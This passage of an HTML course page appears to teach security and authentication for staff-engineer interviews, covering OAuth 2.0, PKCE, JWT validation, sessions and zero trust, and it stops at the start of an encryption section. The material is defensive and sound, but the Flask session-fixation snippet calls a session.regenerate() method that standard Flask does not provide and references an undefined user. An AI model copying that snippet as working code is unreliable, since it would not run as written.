@@ -1,0 +1,1625 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 15: Security &amp; Authentication - Staff Engineer Prep</title>
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+    <style>
+        .security-badge {
+            display: inline-block;
+            padding: 0.25rem 0.75rem;
+            border-radius: 1rem;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin: 0.25rem;
+        }
+        .badge-critical { background: #fed7d7; color: #c53030; }
+        .badge-high { background: #feebc8; color: #c05621; }
+        .badge-medium { background: #fefcbf; color: #975a16; }
+        .badge-info { background: #bee3f8; color: #2b6cb0; }
+        .badge-staff { background: #c6f6d5; color: #276749; }
+
+        .staff-signal {
+            border-left: 4px solid #48bb78;
+            background: rgba(72, 187, 120, 0.08);
+            padding: 1rem 1.25rem;
+            margin: 1.5rem 0;
+            border-radius: 0 0.5rem 0.5rem 0;
+        }
+        .staff-signal strong {
+            color: #276749;
+        }
+
+        .threat-model-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        .threat-model-table th,
+        .threat-model-table td {
+            border: 1px solid var(--border-color, #e2e8f0);
+            padding: 0.75rem;
+            text-align: left;
+        }
+        .threat-model-table th {
+            background: var(--bg-secondary, #f7fafc);
+            font-weight: 600;
+        }
+
+        .comparison-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        @media (max-width: 768px) {
+            .comparison-grid { grid-template-columns: 1fr; }
+        }
+
+        .comparison-card {
+            border: 1px solid var(--border-color, #e2e8f0);
+            border-radius: 0.5rem;
+            padding: 1.25rem;
+        }
+        .comparison-card h4 {
+            margin-top: 0;
+        }
+        .comparison-card.pros { border-left: 4px solid #48bb78; }
+        .comparison-card.cons { border-left: 4px solid #f56565; }
+    </style>
+</head>
+<body>
+    <nav class="navbar" id="main-navbar" data-base="../"></nav>
+
+    <div class="layout-with-sidebar">
+        <aside class="sidebar" id="sd-sidebar"></aside>
+        <button class="sidebar-toggle" id="sidebarToggle">&#9776;</button>
+        <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+        <main class="main-content">
+            <h1>Module 15: Security &amp; Authentication</h1>
+            <p class="subtitle">Designing secure systems at scale &mdash; from authentication flows to zero trust architecture</p>
+
+            <!-- Learning Objectives -->
+            <div class="card">
+                <h3>What You'll Learn</h3>
+                <ul>
+                    <li>How to naturally weave security into system design discussions (a key staff-level signal)</li>
+                    <li>OAuth 2.0 flows in depth: Authorization Code, Client Credentials, PKCE</li>
+                    <li>JWT internals: structure, signing, validation, and revocation strategies</li>
+                    <li>Session management trade-offs: server-side vs stateless tokens</li>
+                    <li>Zero Trust Architecture and how Google BeyondCorp changed the industry</li>
+                    <li>Encryption at rest, in transit, and end-to-end &mdash; with key management</li>
+                    <li>OWASP Top 10 vulnerabilities and how to prevent them</li>
+                    <li>API security patterns: rate limiting, signing, CORS</li>
+                    <li>Data privacy, GDPR compliance, and PII handling at scale</li>
+                </ul>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 1: Security in System Design Interviews -->
+            <!-- ============================================================ -->
+            <h2>1. Security in System Design Interviews</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>Why Security Is a Staff-Level Differentiator</span>
+                </div>
+                <div class="collapsible-content">
+                    <p>
+                        Most candidates treat security as an afterthought &mdash; something they mention when the interviewer specifically asks about it. Staff-level candidates proactively address security throughout the design. This is one of the clearest signals of seniority.
+                    </p>
+
+                    <div class="staff-signal">
+                        <strong>Staff-Level Signal:</strong> Don't wait to be asked. When you describe a data flow, mention how it's authenticated. When you design an API, discuss authorization. When you store data, address encryption. Weave security into the conversation naturally.
+                    </div>
+
+                    <h4>When to Bring Up Security</h4>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Design Phase</th>
+                                <th>Security Consideration</th>
+                                <th>Example Statement</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Requirements</td>
+                                <td>Threat modeling</td>
+                                <td>"Who are our adversaries? What's the blast radius if this is compromised?"</td>
+                            </tr>
+                            <tr>
+                                <td>API Design</td>
+                                <td>AuthN/AuthZ</td>
+                                <td>"Every endpoint needs authentication. Let me define the authorization model."</td>
+                            </tr>
+                            <tr>
+                                <td>Data Storage</td>
+                                <td>Encryption, PII</td>
+                                <td>"PII goes in a separate data store with encryption at rest and strict ACLs."</td>
+                            </tr>
+                            <tr>
+                                <td>Service Communication</td>
+                                <td>mTLS, service identity</td>
+                                <td>"Services communicate over mTLS with SPIFFE-based identity."</td>
+                            </tr>
+                            <tr>
+                                <td>External Integrations</td>
+                                <td>Input validation, SSRF</td>
+                                <td>"We validate and sanitize all external input. Outbound calls go through a proxy."</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h4>The STRIDE Threat Model</h4>
+                    <p>A useful mental framework for quickly identifying threats during an interview:</p>
+                    <ul>
+                        <li><strong>S</strong>poofing &mdash; Can an attacker pretend to be someone else? (Address with authentication)</li>
+                        <li><strong>T</strong>ampering &mdash; Can data be modified in transit? (Address with integrity checks, TLS)</li>
+                        <li><strong>R</strong>epudiation &mdash; Can someone deny an action? (Address with audit logging)</li>
+                        <li><strong>I</strong>nformation Disclosure &mdash; Can data leak? (Address with encryption, access control)</li>
+                        <li><strong>D</strong>enial of Service &mdash; Can the system be overwhelmed? (Address with rate limiting)</li>
+                        <li><strong>E</strong>levation of Privilege &mdash; Can a user gain unauthorized access? (Address with authorization)</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 2: Authentication vs Authorization -->
+            <!-- ============================================================ -->
+            <h2>2. Authentication vs Authorization</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>The Identity Pipeline</span>
+                </div>
+                <div class="collapsible-content">
+                    <p>These two concepts are often confused, but the distinction is critical:</p>
+
+                    <div class="comparison-grid">
+                        <div class="comparison-card">
+                            <h4>Authentication (AuthN)</h4>
+                            <p><strong>"Who are you?"</strong></p>
+                            <ul>
+                                <li>Verifies identity</li>
+                                <li>Happens first in the pipeline</li>
+                                <li>Mechanisms: passwords, MFA, certificates, biometrics</li>
+                                <li>Result: an identity token or session</li>
+                            </ul>
+                            <p><em>Analogy: Showing your passport at the airport.</em></p>
+                        </div>
+                        <div class="comparison-card">
+                            <h4>Authorization (AuthZ)</h4>
+                            <p><strong>"What can you do?"</strong></p>
+                            <ul>
+                                <li>Determines permissions</li>
+                                <li>Happens after authentication</li>
+                                <li>Mechanisms: RBAC, ABAC, ACLs, policies</li>
+                                <li>Result: allow or deny the action</li>
+                            </ul>
+                            <p><em>Analogy: Your boarding pass determines which gate and seat.</em></p>
+                        </div>
+                    </div>
+
+                    <h4>The Identity Pipeline in a Microservices System</h4>
+                    <div class="diagram-container">
+                        <div class="mermaid">
+sequenceDiagram
+    participant U as User
+    participant GW as API Gateway
+    participant IdP as Identity Provider
+    participant AuthZ as Authorization Service
+    participant Svc as Backend Service
+
+    U->>GW: Request + Credentials
+    GW->>IdP: Validate token / session
+    IdP-->>GW: Identity (user ID, roles, claims)
+    GW->>AuthZ: Can user X do action Y on resource Z?
+    AuthZ-->>GW: Allow / Deny
+    GW->>Svc: Forward request + identity context
+    Svc-->>GW: Response
+    GW-->>U: Response
+                        </div>
+                    </div>
+
+                    <h4>Authorization Models Comparison</h4>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Model</th>
+                                <th>How It Works</th>
+                                <th>Best For</th>
+                                <th>Example</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>RBAC</strong> (Role-Based)</td>
+                                <td>Permissions assigned to roles; users get roles</td>
+                                <td>Enterprise apps, clear hierarchies</td>
+                                <td>Admin, Editor, Viewer</td>
+                            </tr>
+                            <tr>
+                                <td><strong>ABAC</strong> (Attribute-Based)</td>
+                                <td>Policies evaluate attributes of user, resource, environment</td>
+                                <td>Fine-grained, context-aware access</td>
+                                <td>"Allow if user.department == resource.department AND time is business hours"</td>
+                            </tr>
+                            <tr>
+                                <td><strong>ACL</strong> (Access Control List)</td>
+                                <td>Per-resource list of who can do what</td>
+                                <td>File systems, simple sharing</td>
+                                <td>Google Docs sharing list</td>
+                            </tr>
+                            <tr>
+                                <td><strong>ReBAC</strong> (Relationship-Based)</td>
+                                <td>Permissions derived from relationships in a graph</td>
+                                <td>Social networks, hierarchical orgs</td>
+                                <td>Google Zanzibar &mdash; used by Google Drive, YouTube</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <div class="staff-signal">
+                        <strong>Staff-Level Signal:</strong> In interviews, mention Google Zanzibar when discussing authorization at scale. It's a relationship-based authorization system that powers Google Drive, YouTube, and Cloud IAM. It handles millions of authorization checks per second with global consistency.
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 3: OAuth 2.0 Deep Dive -->
+            <!-- ============================================================ -->
+            <h2>3. OAuth 2.0 Deep Dive</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>OAuth 2.0 Flows, Tokens, and Scopes</span>
+                </div>
+                <div class="collapsible-content">
+                    <p>
+                        OAuth 2.0 is the industry standard for delegated authorization. It allows a user to grant a third-party application limited access to their resources without sharing credentials. Understanding OAuth deeply is essential &mdash; it comes up in nearly every system design involving user authentication.
+                    </p>
+
+                    <h4>Key Roles in OAuth 2.0</h4>
+                    <ul>
+                        <li><strong>Resource Owner</strong> &mdash; The user who owns the data</li>
+                        <li><strong>Client</strong> &mdash; The application requesting access (your app)</li>
+                        <li><strong>Authorization Server</strong> &mdash; Issues tokens (e.g., Google's OAuth server)</li>
+                        <li><strong>Resource Server</strong> &mdash; Hosts the protected API (e.g., Google Calendar API)</li>
+                    </ul>
+
+                    <h3>Authorization Code Flow (Most Common)</h3>
+                    <p>Used by server-side web applications. The most secure standard flow because the access token is never exposed to the browser.</p>
+
+                    <div class="diagram-container">
+                        <div class="mermaid">
+sequenceDiagram
+    participant U as User (Browser)
+    participant App as Your App (Server)
+    participant AS as Authorization Server
+    participant RS as Resource Server
+
+    U->>App: Click "Sign in with Google"
+    App->>U: Redirect to AS /authorize
+    Note over U,AS: redirect_uri, client_id, scope, state
+    U->>AS: Login + consent
+    AS->>U: Redirect to redirect_uri with auth code
+    U->>App: GET /callback?code=abc123&amp;state=xyz
+    App->>AS: POST /token (code + client_secret)
+    AS-->>App: access_token + refresh_token + id_token
+    App->>RS: GET /api/data (Bearer access_token)
+    RS-->>App: Protected resource
+    App-->>U: Display data
+                        </div>
+                    </div>
+
+                    <p><strong>Why the extra step with the authorization code?</strong> The code is exchanged server-side where the <code>client_secret</code> can be kept safe. If we returned the access token directly to the browser (implicit flow), it could be intercepted. This is why the implicit flow is now deprecated.</p>
+
+                    <h3>Client Credentials Flow (Service-to-Service)</h3>
+                    <p>Used when there is no user involved &mdash; one service authenticating to another.</p>
+                    <pre class="code-block"><code># Service-to-service token exchange
+POST /oauth/token HTTP/1.1
+Host: auth.example.com
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=client_credentials
+&amp;client_id=payment-service
+&amp;client_secret=s3cr3t
+&amp;scope=orders.read+inventory.write</code></pre>
+
+                    <p>The authorization server returns an access token scoped to the requested permissions. No user consent is needed because this is machine-to-machine communication.</p>
+
+                    <h3>PKCE (Proof Key for Code Exchange) for Public Clients</h3>
+                    <p>Mobile apps and SPAs can't safely store a <code>client_secret</code>. PKCE adds a dynamic secret to each authorization request:</p>
+
+                    <ol>
+                        <li>Client generates a random <code>code_verifier</code> (43-128 chars)</li>
+                        <li>Client computes <code>code_challenge = BASE64URL(SHA256(code_verifier))</code></li>
+                        <li>Client sends <code>code_challenge</code> with the authorization request</li>
+                        <li>When exchanging the auth code, client sends the original <code>code_verifier</code></li>
+                        <li>Authorization server verifies: <code>SHA256(code_verifier) == code_challenge</code></li>
+                    </ol>
+
+                    <p>Even if an attacker intercepts the authorization code, they can't exchange it without the <code>code_verifier</code>.</p>
+
+                    <h3>Token Types</h3>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Token</th>
+                                <th>Purpose</th>
+                                <th>Lifetime</th>
+                                <th>Storage</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Access Token</strong></td>
+                                <td>Authorize API requests</td>
+                                <td>Short (5-60 minutes)</td>
+                                <td>Memory (never localStorage)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Refresh Token</strong></td>
+                                <td>Get new access tokens without re-login</td>
+                                <td>Long (days to months)</td>
+                                <td>Secure, HttpOnly cookie or server-side</td>
+                            </tr>
+                            <tr>
+                                <td><strong>ID Token</strong> (OIDC)</td>
+                                <td>Identify the user (contains claims)</td>
+                                <td>Short (matches access token)</td>
+                                <td>Validated then discarded or stored briefly</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h3>Scopes and Consent</h3>
+                    <p>Scopes define what the client can do. Follow the principle of least privilege:</p>
+                    <pre class="code-block"><code># Bad: requesting overly broad access
+scope=user.all+admin.all
+
+# Good: request only what you need
+scope=user.profile.read+user.email.read</code></pre>
+
+                    <h3>Real Example: "Sign in with Google"</h3>
+                    <p>When you click "Sign in with Google" on a website:</p>
+                    <ol>
+                        <li>The app redirects you to <code>accounts.google.com/o/oauth2/v2/auth</code></li>
+                        <li>You see Google's consent screen: "App X wants to access your email and profile"</li>
+                        <li>You click "Allow"</li>
+                        <li>Google redirects back with an authorization code</li>
+                        <li>The app's server exchanges the code for tokens (using OpenID Connect, an identity layer on top of OAuth 2.0)</li>
+                        <li>The ID token contains your Google user ID, email, name, and profile picture</li>
+                        <li>The app creates a local account or matches to an existing one</li>
+                    </ol>
+
+                    <div class="staff-signal">
+                        <strong>Staff-Level Signal:</strong> Distinguish between OAuth 2.0 (authorization) and OpenID Connect (authentication). OAuth alone doesn't tell you WHO the user is &mdash; it only grants access. OIDC adds the <code>id_token</code> which contains identity claims. When a candidate says "we use OAuth for login," clarify that you mean OIDC on top of OAuth.
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 4: JWT Deep Dive -->
+            <!-- ============================================================ -->
+            <h2>4. JWT (JSON Web Tokens)</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>Structure, Signing, and Revocation</span>
+                </div>
+                <div class="collapsible-content">
+                    <h3>JWT Structure</h3>
+                    <p>A JWT consists of three Base64URL-encoded parts separated by dots:</p>
+                    <pre class="code-block"><code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.       &lt;-- Header
+eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikpva...  &lt;-- Payload
+SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   &lt;-- Signature</code></pre>
+
+                    <h4>Header</h4>
+                    <pre class="code-block"><code>{
+  "alg": "RS256",    // Signing algorithm
+  "typ": "JWT",      // Token type
+  "kid": "key-2024"  // Key ID (for key rotation)
+}</code></pre>
+
+                    <h4>Payload (Claims)</h4>
+                    <pre class="code-block"><code>{
+  "iss": "https://auth.example.com",   // Issuer
+  "sub": "user-12345",                 // Subject (user ID)
+  "aud": "https://api.example.com",    // Audience (intended recipient)
+  "exp": 1700000000,                   // Expiration time
+  "iat": 1699996400,                   // Issued at
+  "nbf": 1699996400,                   // Not valid before
+  "jti": "unique-token-id-abc123",     // JWT ID (for revocation)
+  "roles": ["admin", "editor"],        // Custom claims
+  "tenant_id": "acme-corp"             // Custom claims
+}</code></pre>
+
+                    <h4>Signature</h4>
+                    <pre class="code-block"><code>// For RS256 (asymmetric):
+RSASHA256(
+  base64UrlEncode(header) + "." + base64UrlEncode(payload),
+  privateKey
+)
+
+// Verification uses the PUBLIC key (can be distributed freely)</code></pre>
+
+                    <h3>Signing Algorithms: HS256 vs RS256</h3>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>HS256 (Symmetric)</th>
+                                <th>RS256 (Asymmetric)</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Key type</td>
+                                <td>Shared secret (same key signs &amp; verifies)</td>
+                                <td>Private key signs, public key verifies</td>
+                            </tr>
+                            <tr>
+                                <td>Speed</td>
+                                <td>Faster</td>
+                                <td>Slower (RSA operations)</td>
+                            </tr>
+                            <tr>
+                                <td>Key distribution</td>
+                                <td>Dangerous &mdash; secret must be shared with all verifiers</td>
+                                <td>Safe &mdash; public key can be distributed freely via JWKS endpoint</td>
+                            </tr>
+                            <tr>
+                                <td>Best for</td>
+                                <td>Monolithic apps (single verifier)</td>
+                                <td>Microservices (many verifiers)</td>
+                            </tr>
+                            <tr>
+                                <td>Rotation</td>
+                                <td>Requires coordinated secret rotation</td>
+                                <td>Rotate private key; publish new public key to JWKS</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <div class="staff-signal">
+                        <strong>Staff-Level Signal:</strong> Always recommend RS256 for microservices architectures. With HS256, every service that needs to verify tokens must have the shared secret, increasing blast radius. With RS256, only the auth service has the private key; everyone else uses the public key from a JWKS (JSON Web Key Set) endpoint.
+                    </div>
+
+                    <h3>JWT Validation Flow</h3>
+                    <div class="diagram-container">
+                        <div class="mermaid">
+flowchart TD
+    A[Receive JWT] --> B{Check signature}
+    B -->|Invalid| Z[REJECT: Invalid signature]
+    B -->|Valid| C{Check exp claim}
+    C -->|Expired| Z2[REJECT: Token expired]
+    C -->|Valid| D{Check iss claim}
+    D -->|Unknown issuer| Z3[REJECT: Unknown issuer]
+    D -->|Valid| E{Check aud claim}
+    E -->|Wrong audience| Z4[REJECT: Wrong audience]
+    E -->|Valid| F{Check nbf claim}
+    F -->|Not yet valid| Z5[REJECT: Not yet valid]
+    F -->|Valid| G{Check blocklist}
+    G -->|Revoked| Z6[REJECT: Token revoked]
+    G -->|OK| H[ACCEPT: Extract claims and proceed]
+
+    style Z fill:#fc8181,color:#000
+    style Z2 fill:#fc8181,color:#000
+    style Z3 fill:#fc8181,color:#000
+    style Z4 fill:#fc8181,color:#000
+    style Z5 fill:#fc8181,color:#000
+    style Z6 fill:#fc8181,color:#000
+    style H fill:#68d391,color:#000
+                        </div>
+                    </div>
+
+                    <h3>Pros and Cons of JWTs</h3>
+                    <div class="comparison-grid">
+                        <div class="comparison-card pros">
+                            <h4>Advantages</h4>
+                            <ul>
+                                <li><strong>Stateless:</strong> No server-side session storage needed</li>
+                                <li><strong>Scalable:</strong> Any service can validate without a central session store</li>
+                                <li><strong>Cross-domain:</strong> Works across services and domains</li>
+                                <li><strong>Self-contained:</strong> Carries user claims, reducing DB lookups</li>
+                                <li><strong>Standard:</strong> Well-defined RFC 7519 with libraries in every language</li>
+                            </ul>
+                        </div>
+                        <div class="comparison-card cons">
+                            <h4>Disadvantages</h4>
+                            <ul>
+                                <li><strong>Can't revoke easily:</strong> Valid until expiration (no central session to delete)</li>
+                                <li><strong>Size overhead:</strong> Larger than opaque tokens (1-2 KB vs 32 bytes)</li>
+                                <li><strong>Stale data:</strong> Claims may be outdated if user roles change mid-session</li>
+                                <li><strong>Security risk if stored wrong:</strong> localStorage is vulnerable to XSS</li>
+                                <li><strong>Algorithm confusion attacks:</strong> Must validate <code>alg</code> header carefully</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <h3>Token Revocation Strategies</h3>
+                    <p>Since JWTs are stateless, revoking them requires trade-offs:</p>
+
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Strategy</th>
+                                <th>How It Works</th>
+                                <th>Trade-off</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Short TTL</strong></td>
+                                <td>Set access tokens to expire in 5-15 minutes; use refresh tokens</td>
+                                <td>Simple; slight delay in revocation (up to TTL)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Token Blocklist</strong></td>
+                                <td>Maintain a Redis set of revoked <code>jti</code> values; check on each request</td>
+                                <td>Immediate revocation; adds a network call (partially defeats statelessness)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Token Versioning</strong></td>
+                                <td>Store a <code>token_version</code> per user in DB; include version in JWT; reject mismatched versions</td>
+                                <td>Revokes all tokens for a user at once; requires one DB lookup</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Refresh Token Rotation</strong></td>
+                                <td>Issue new refresh token on each use; revoke old one; detect reuse as compromise</td>
+                                <td>Detects token theft; adds complexity</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <pre class="code-block"><code># Python: JWT validation with PyJWT
+import jwt
+from jwt import PyJWKClient
+
+# Fetch public keys from JWKS endpoint
+jwks_client = PyJWKClient("https://auth.example.com/.well-known/jwks.json")
+signing_key = jwks_client.get_signing_key_from_jwt(token)
+
+try:
+    payload = jwt.decode(
+        token,
+        signing_key.key,
+        algorithms=["RS256"],          # ALWAYS specify allowed algorithms
+        audience="https://api.example.com",
+        issuer="https://auth.example.com",
+        options={"require": ["exp", "iss", "aud", "sub"]}
+    )
+    user_id = payload["sub"]
+    roles = payload.get("roles", [])
+except jwt.ExpiredSignatureError:
+    return 401, "Token expired"
+except jwt.InvalidAudienceError:
+    return 401, "Invalid audience"
+except jwt.InvalidTokenError:
+    return 401, "Invalid token"</code></pre>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 5: Session Management -->
+            <!-- ============================================================ -->
+            <h2>5. Session Management</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>Server-Side Sessions vs JWTs</span>
+                </div>
+                <div class="collapsible-content">
+                    <h3>Server-Side Sessions</h3>
+                    <p>The traditional approach: the server stores session data and gives the client an opaque session ID.</p>
+
+                    <pre class="code-block"><code># Server-side session flow:
+# 1. User logs in
+# 2. Server creates session: Redis SET session:abc123 {user_id: 42, roles: ["admin"]}
+# 3. Server sets cookie: Set-Cookie: sid=abc123; HttpOnly; Secure; SameSite=Lax
+# 4. Client sends cookie on each request
+# 5. Server looks up session: Redis GET session:abc123
+# 6. On logout: Redis DEL session:abc123</code></pre>
+
+                    <h3>Session Storage Options</h3>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Storage</th>
+                                <th>Latency</th>
+                                <th>Durability</th>
+                                <th>Scale</th>
+                                <th>Use Case</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Redis</strong></td>
+                                <td>&lt;1ms</td>
+                                <td>Configurable (AOF/RDB)</td>
+                                <td>Cluster mode for horizontal scale</td>
+                                <td>Most web apps; fast TTL-based expiry</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Memcached</strong></td>
+                                <td>&lt;1ms</td>
+                                <td>None (in-memory only)</td>
+                                <td>Easy horizontal scale</td>
+                                <td>Simple sessions; OK to lose on restart</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Database</strong></td>
+                                <td>5-20ms</td>
+                                <td>High</td>
+                                <td>Depends on DB</td>
+                                <td>Audit requirements; need session history</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h3>Sessions vs JWTs: When to Use Which</h3>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Factor</th>
+                                <th>Server-Side Sessions</th>
+                                <th>JWTs</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Revocation</td>
+                                <td>Instant (delete from store)</td>
+                                <td>Delayed or requires blocklist</td>
+                            </tr>
+                            <tr>
+                                <td>Scalability</td>
+                                <td>Requires shared session store</td>
+                                <td>Stateless; no shared state</td>
+                            </tr>
+                            <tr>
+                                <td>Cross-domain</td>
+                                <td>Difficult (cookies are domain-bound)</td>
+                                <td>Easy (sent in Authorization header)</td>
+                            </tr>
+                            <tr>
+                                <td>Storage cost</td>
+                                <td>Server-side (Redis memory)</td>
+                                <td>Client-side (no server storage)</td>
+                            </tr>
+                            <tr>
+                                <td>Best for</td>
+                                <td>Traditional web apps, strict security requirements</td>
+                                <td>Microservices, APIs, mobile apps</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h3>Session Security: Preventing Attacks</h3>
+
+                    <h4>Session Fixation</h4>
+                    <p><strong>Attack:</strong> Attacker sets a known session ID in the victim's browser, then waits for them to log in.</p>
+                    <p><strong>Prevention:</strong> Always regenerate the session ID after authentication.</p>
+                    <pre class="code-block"><code># Python (Flask):
+@app.route('/login', methods=['POST'])
+def login():
+    if authenticate(request.form['user'], request.form['pass']):
+        session.regenerate()  # NEW session ID after login
+        session['user_id'] = user.id
+        return redirect('/dashboard')</code></pre>
+
+                    <h4>Session Hijacking</h4>
+                    <p><strong>Attack:</strong> Attacker steals session cookie via XSS or network sniffing.</p>
+                    <p><strong>Prevention:</strong> Secure cookie attributes:</p>
+                    <pre class="code-block"><code>Set-Cookie: sid=abc123;
+    HttpOnly;     // JavaScript cannot read the cookie (prevents XSS theft)
+    Secure;       // Only sent over HTTPS
+    SameSite=Lax; // Prevents CSRF (not sent on cross-origin POST)
+    Path=/;       // Cookie scope
+    Max-Age=3600; // 1 hour expiry</code></pre>
+
+                    <div class="staff-signal">
+                        <strong>Staff-Level Signal:</strong> In practice, most production systems use a hybrid approach. Short-lived JWTs for API authorization (5-15 min TTL) with server-side refresh token storage in Redis. This gives you the scalability of JWTs with the revocability of server-side sessions. Mention this nuance in interviews.
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 6: Zero Trust Architecture -->
+            <!-- ============================================================ -->
+            <h2>6. Zero Trust Architecture</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>Never Trust, Always Verify</span>
+                </div>
+                <div class="collapsible-content">
+                    <p>
+                        Traditional security models use a perimeter-based approach: "everything inside the network is trusted." Zero Trust assumes that the network is already compromised and verifies every request regardless of where it originates.
+                    </p>
+
+                    <h3>Core Principles</h3>
+                    <ul>
+                        <li><strong>Verify explicitly:</strong> Always authenticate and authorize based on all available data (user identity, device health, location, service identity)</li>
+                        <li><strong>Least privilege access:</strong> Grant just-in-time, just-enough-access (JIT/JEA)</li>
+                        <li><strong>Assume breach:</strong> Minimize blast radius, segment access, verify end-to-end encryption, use analytics to detect anomalies</li>
+                    </ul>
+
+                    <h3>Zero Trust Request Flow</h3>
+                    <div class="diagram-container">
+                        <div class="mermaid">
+flowchart LR
+    subgraph Client
+        A[User/Service] --> B[Device Health Check]
+    end
+
+    subgraph "Zero Trust Proxy"
+        C[Identity Verification]
+        D[Policy Engine]
+        E[Context Evaluation]
+    end
+
+    subgraph Backend
+        F[Service A]
+        G[Service B]
+        H[Database]
+    end
+
+    B --> C
+    C --> D
+    D --> E
+    E -->|"mTLS + JWT"| F
+    E -->|"mTLS + JWT"| G
+    F -->|"mTLS"| H
+
+    style D fill:#4299e1,color:#fff
+    style E fill:#48bb78,color:#fff
+                        </div>
+                    </div>
+
+                    <h3>Google BeyondCorp</h3>
+                    <p>
+                        Google's implementation of Zero Trust, published in 2014. After the Aurora attacks (2009), Google realized that VPNs and network perimeters were insufficient. BeyondCorp makes access decisions based on:
+                    </p>
+                    <ul>
+                        <li><strong>User identity:</strong> Who is making the request? (Strong authentication, MFA)</li>
+                        <li><strong>Device trust:</strong> Is the device managed? Is it patched? Does it have a valid certificate?</li>
+                        <li><strong>Context:</strong> Where is the request coming from? What time? What's the risk score?</li>
+                        <li><strong>Access policy:</strong> Does this combination of factors satisfy the policy for this resource?</li>
+                    </ul>
+                    <p>
+                        Key insight: Google employees access internal apps the same way whether they're in the office or at a coffee shop. There is no VPN. Every request goes through an access proxy that makes a policy decision.
+                    </p>
+
+                    <h3>Mutual TLS (mTLS) for Service-to-Service</h3>
+                    <p>In standard TLS, only the server presents a certificate. In mTLS, both sides authenticate:</p>
+                    <ol>
+                        <li>Client connects to server</li>
+                        <li>Server sends its certificate &mdash; client verifies it</li>
+                        <li>Server requests client's certificate &mdash; server verifies it</li>
+                        <li>Both sides now have cryptographically verified identities</li>
+                        <li>Encrypted channel established</li>
+                    </ol>
+
+                    <h3>SPIFFE/SPIRE: Service Identity</h3>
+                    <p>
+                        <strong>SPIFFE</strong> (Secure Production Identity Framework for Everyone) provides a standard for service identity. Each service gets a <strong>SPIFFE ID</strong>:
+                    </p>
+                    <pre class="code-block"><code>spiffe://example.com/payment-service
+spiffe://example.com/order-service
+spiffe://example.com/k8s/ns/production/sa/api-server</code></pre>
+
+                    <p>
+                        <strong>SPIRE</strong> is the reference implementation that issues short-lived X.509 certificates (SVIDs) to workloads. These certificates enable mTLS without managing static certificates.
+                    </p>
+
+                    <div class="staff-signal">
+                        <strong>Staff-Level Signal:</strong> When designing service-to-service communication, say: "We'll use mTLS with SPIFFE-based identities. Each service gets an auto-rotated short-lived certificate. Authorization policies reference SPIFFE IDs, not IP addresses, because in a dynamic container environment, IPs change constantly."
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 7: Encryption -->
+            <!-- ============================================================ -->
+            <h2>7. Encryption</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>At Rest, In Transit, and End-to-End</span>
+                </div>
+                <div class="collapsible-content">
+
+                    <h3>Encryption at Rest</h3>
+                    <p>Protects data stored on disk from physical theft or unauthorized access to storage.</p>
+
+                    <h4>Envelope Encryption (Industry Standard)</h4>
+                    <p>
